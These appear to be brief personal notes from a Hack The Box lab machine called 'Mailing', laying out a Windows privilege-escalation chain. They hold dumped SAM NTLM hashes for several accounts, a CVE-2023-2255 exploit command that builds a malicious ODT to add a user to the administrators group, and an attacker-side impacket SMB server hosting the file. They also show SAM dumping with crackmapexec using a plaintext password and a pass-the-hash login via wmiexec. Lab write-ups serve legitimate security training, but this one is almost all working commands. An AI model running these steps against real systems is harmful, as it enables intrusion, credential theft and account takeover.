sam hashes:  
  
```
SMB 10.10.11.14 445 MAILING Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
SMB 10.10.11.14 445 MAILING Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB 10.10.11.14 445 MAILING DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
SMB 10.10.11.14 445 MAILING WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::  
SMB 10.10.11.14 445 MAILING localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::  
SMB 10.10.11.14 445 MAILING maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
```



```
python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'  
  
Start SMB Server  
impacket-smbserver mailing `pwd` -smb2support  
[[smb]]

  
copy file to C:\Important Documents  
net use \\<ip>\mailing  
copy \\<ip>\mailing\exploit.odt  
  
> wait a few seconds then confirm maya is an admin  
net user maya  
  
>dump sam hash  
crackmapexec smb <box-ip> -u maya -p "m4y4ngs4ri" --sam  
  
> auth with localadmin hashes  
impacket-wmiexec localadmin@<box-ip> -hashes "<hashes>"

```

[[smb]]
[[mailing]]
[[htb]]
[[windows]]
